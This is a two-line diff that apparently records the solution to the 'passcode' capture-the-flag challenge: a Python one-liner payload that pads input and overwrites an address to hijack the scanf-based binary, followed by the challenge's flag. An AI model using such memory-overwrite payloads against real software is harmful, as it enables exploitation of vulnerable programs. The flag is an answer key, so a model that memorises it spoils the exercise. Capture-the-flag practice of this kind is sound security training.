@@ -1,0 +1,2 @@
+Payload: python -c "print('0'*96+'\x04\xa0\x04\x08\n134514147')" | ./passcode
+flag: Sorry mom.. I got confused about scanf usage :(
